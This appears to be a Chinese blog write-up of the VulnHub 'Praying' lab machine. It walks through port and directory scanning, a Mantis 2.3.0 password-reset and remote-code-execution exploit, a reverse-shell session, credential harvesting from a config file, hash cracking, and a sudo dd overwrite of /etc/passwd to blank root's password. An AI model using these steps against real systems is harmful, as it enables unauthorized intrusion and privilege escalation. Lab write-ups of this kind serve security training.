> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dvUlZfIcDYR_FN7BHg0ktw)

**0x01** Introduction  

* * *

虚拟机下载页面：http://www.vulnhub.com/entry/praying-1,575/  

Description

```
This is an easy->intermediate boot2root with a mix of real world and ctf. Created in Virtualbox. Goal: Get the root flag. Your feedback is appreciated -- Twitter: @iamv1nc3nt

This works better with VirtualBox rather than VMware.
```

‍

**0x02 Writeup**  

#### 1 getshell

##### 1.1 端口信息

nmap 扫描开放端口

```
PORT      STATE   SERVICE    VERSION
80/tcp     open     http      Apache httpd 2.4.41 ((Ubuntu))
```

##### 1.2 脆弱服务

服务器只开放了 80 端口，访问后为 apache 默认页面，于是用 dirb 跑了一下目录，发现了 admin 目录。

目录扫描：  

```
==> DIRECTORY: http://192.168.56.105/admin/
```

#### 发现后发现为 mantis 的登陆页面

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQR5kxIIaic9xibbfLbS9r0exHNvCabqhN7eLpMGlg2ibaVBsYQh26HDdreu3JdApCzbkaicyeGCWhzgFQ/640?wx_fmt=jpeg)

测试了一下发现依然存在任意账户口令重置漏洞。修改 aministrator 账户登陆，发现版本为 2.3.0。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQR5kxIIaic9xibbfLbS9r0exH0fl4m0SR8yJJ6wJdJSR05wUlCBsdAODITfDvQX7Ul5QFEjp9lRL5hw/640?wx_fmt=jpeg)

利用 searchsploit 直接找到了命令执行代码。

```
Mantis Bug Tracker 2.3.0 - Remote Code E | php/webapps/48818.py
```

于是得到了第一个 shell。

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.56.101:4444 
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.105:55892) at 2020-11-26 08:31:16 -0500

id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@praying:/var/www/html$
```

##### 2.2 权限提权  

先做了一些信息收集

```
cat /etc/passwd|grep /bin/bash
root::0:0:root:/root:/bin/bash
mantis:x:1000:1000:praying:/home/mantis:/bin/bash
developer:x:1001:1001:,,,:/home/developer:/bin/bash
projman:x:1002:1002:,,,:/home/projman:/bin/bash
elevate:x:1003:1003:,,,:/home/elevate:/bin/bash
root:x:0:0:root:/root:/bin/bash
mantis:x:1000:1000:praying:/home/mantis:/bin/bash
developer:x:1001:1001:,,,:/home/developer:/bin/bash
projman:x:1002:1002:,,,:/home/projman:/bin/bash
elevate:x:1003:1003:,,,:/home/elevate:/bin/bash

ls -all /home
total 24
drwxr-xr-x  6 root      root      4096 Sep 24 23:01 .
drwxr-xr-x 20 root      root      4096 Sep 24 16:12 ..
drwx------  3 developer developer 4096 Sep 24 20:15 developer
drwx------  4 elevate   elevate   4096 Nov 26 13:12 elevate
drwx------  4 mantis    mantis    4096 Sep 26 23:25 mantis
drwx------  5 projman   projman   4096 Sep 26 23:27 projman
```

发现了用户 mantis，于是查看还有没有该用户相关的文件。

发现存在 / var/www/redmine 目录，进入之后在 database.yml 找到了用户 projman 的口令。

```
adapter: mysql2
  database: redmine
  host: localhost
  username: projman
  password: "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
  # Use "utf8" instead of "utfmb4" for MySQL prior to 5.7.7
  encoding: utf8mb4
```

切换用户登陆，发现该用户下有一个文件为. part1。

```
ls -all
total 36
drwx------ 5 projman projman 4096 Sep 26 23:27 .
drwxr-xr-x 6 root    root    4096 Sep 24 23:01 ..
lrwxrwxrwx 1 projman projman    9 Sep 24 23:19 .bash_history -> /dev/null
-rw-r--r-- 1 projman projman  220 Sep 24 20:11 .bash_logout
-rw-r--r-- 1 projman projman 3771 Sep 24 20:11 .bashrc
drwx------ 2 projman projman 4096 Sep 24 20:13 .cache
drwxrwxr-x 3 projman projman 4096 Sep 24 23:47 .local
-rw-r--r-- 1 projman projman   33 Sep 24 23:47 .part1
-rw-r--r-- 1 projman projman  807 Sep 24 20:11 .profile
drwx------ 2 projman projman 4096 Sep 26 23:27 .ssh
cat .part1
4914CACB6C089C74AEAEB87497AF2FBA
```

将该密码放到 cmd5 破解得到新的用户 elevate 的密码 tequieromucho。

切换到该用户，查看 sudo -l，发现可以 sudo 执行 dd 命令。这个就比较简单了，重写一个 / etc/passwd 取消 root 账户密码，成功获取 root。这是新的 passwd 文件 1.txt。

```
cat 1.txt
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
........................
```

```
elevate@praying:~$ sudo -u root dd if=1.txt of=/etc/passwd
sudo -u root dd if=1.txt of=/etc/passwd
[sudo] password for elevate: tequieromucho

8+1 records in
8+1 records out
4106 bytes (4.1 kB, 4.0 KiB) copied, 0.000241207 s, 17.0 MB/s
elevate@praying:~$ su - root
su - root
root@praying:~# ls
ls
message  part2  root.txt  snap
root@praying:~# cat root.txt
cat root.txt

 ██▓███   ██▀███  ▄▄▄     ▓██   ██▓ ██▓ ███▄    █   ▄████ 
▓██░  ██▒▓██ ▒ ██▒████▄    ▒██  ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒
▓██░ ██▓▒▓██ ░▄█ ▒██  ▀█▄   ▒██ ██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
▒██▄█▓▒ ▒▒██▀▀█▄ ░██▄▄▄▄██  ░ ▐██▓░░██░▓██▒  ▐▌██▒░▓█  ██▓
▒██▒ ░  ░░██▓ ▒██▒▓█   ▓██▒ ░ ██▒▓░░██░▒██░   ▓██░░▒▓███▀▒
▒▓▒░ ░  ░░ ▒▓ ░▒▓░▒▒   ▓▒█░  ██▒▒▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
░▒ ░       ░▒ ░ ▒░ ▒   ▒▒ ░▓██ ░▒░  ▒ ░░ ░░   ░ ▒░  ░   ░ 
░░         ░░   ░  ░   ▒   ▒ ▒ ░░   ▒ ░   ░   ░ ░ ░ ░   ░ 
            ░          ░  ░░ ░      ░           ░       ░ 
 ███▄ ▄███▓ ▄▄▄      ███▄  ░ █ ▄▄▄█████▓ ██▓  ██████      
▓██▒▀█▀ ██▒▒████▄    ██ ▀█   █ ▓  ██▒ ▓▒▓██▒▒██    ▒      
▓██    ▓██░▒██  ▀█▄ ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██▒░ ▓██▄        
▒██    ▒██ ░██▄▄▄▄██▓██▒  ▐▌██▒░ ▓██▓ ░ ░██░  ▒   ██▒     
▒██▒   ░██▒ ▓█   ▓██▒██░   ▓██░  ▒██▒ ░ ░██░▒██████▒▒     
░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒░   ▒ ▒   ▒ ░░   ░▓  ▒ ▒▓▒ ▒ ░     
░  ░      ░  ▒   ▒▒ ░ ░░   ░ ▒░    ░     ▒ ░░ ░▒  ░ ░     
░      ░     ░   ▒     ░   ░ ░   ░       ▒ ░░  ░  ░       
 ██▀███░  ▒█████ ░ ▒█████  ▄▄▄█████▓▓█████ ▓█████▄░ ▐██▌  
▓██ ▒ ██▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒▓█   ▀ ▒██▀ ██▌ ▐██▌  
▓██ ░▄█ ▒▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░▒███   ░██   █▌ ▐██▌  
▒██▀▀█▄  ▒██   ██░▒██   ██░░ ▓██▓ ░ ▒▓█  ▄ ░▓█▄   ▌ ▓██▒  
░██▓ ▒██▒░ ████▓▒░░ ████▓▒░  ▒██▒ ░ ░▒████▒░▒████▓  ▒▄▄   
░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░   ░░ ▒░ ░ ▒▒▓  ▒  ░▀▀▒  
  ░▒ ░ ▒░  ░ ▒ ▒░   ░ ▒ ▒░     ░     ░ ░  ░ ░ ▒  ▒  ░  ░  
  ░░   ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░         ░    ░ ░  ░     ░  
   ░         ░ ░      ░ ░              ░  ░   ░     ░     
                                            ░             
```

**PS：**许多人企求着生活的完美结局，殊不知美根本不在结局，而在于追求的过程。

更多精彩

*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
    
*   [](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486968&idx=1&sn=7f66208298cf2cec57286947ddb8b223&chksm=fcfc30aecb8bb9b8333c1d05976dbdbf33d34f2a0d2b0cdfc41e835d29b9b4bcfc352504f8e4&scene=21#wechat_redirect)[vulnhub 之 VulnImage_1 靶场 writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247487106&idx=1&sn=a51d3cfedffb4adf84ccd682479b2ee4&chksm=fcfc33d4cb8bbac2ce47aac3bb491c1d9f2b603eaf1a2dd731cf7f11c5cdbb91e39f34ba5b26&scene=21#wechat_redirect)  
    
*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
    

![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)

**如果感觉文章不错，分享让更多的人知道吧！**